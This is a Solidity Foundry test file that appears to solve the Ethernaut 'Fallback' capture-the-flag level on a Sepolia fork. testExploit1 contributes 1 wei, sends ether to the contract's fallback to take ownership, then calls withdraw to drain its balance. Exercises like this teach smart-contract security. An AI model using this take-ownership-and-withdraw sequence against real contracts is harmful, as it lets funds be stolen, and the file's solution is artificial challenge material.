// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../src/levels/01-Fallback/Fallback.sol";

contract ContractTest2 is DSTest {
 
    Fallback level1 = Fallback(payable(0x76ee97aC9A91BA9fAE43400a8d4F2074E0e5E248));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit1() public {
            
        level1.contribute{value: 1 wei}();
        level1.contributions(0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB);
        level1.getContribution();
        address(level1).call{value: 1 wei}(""); //send 1
        level1.owner();
        level1.withdraw();
    }
  receive() external payable {}
}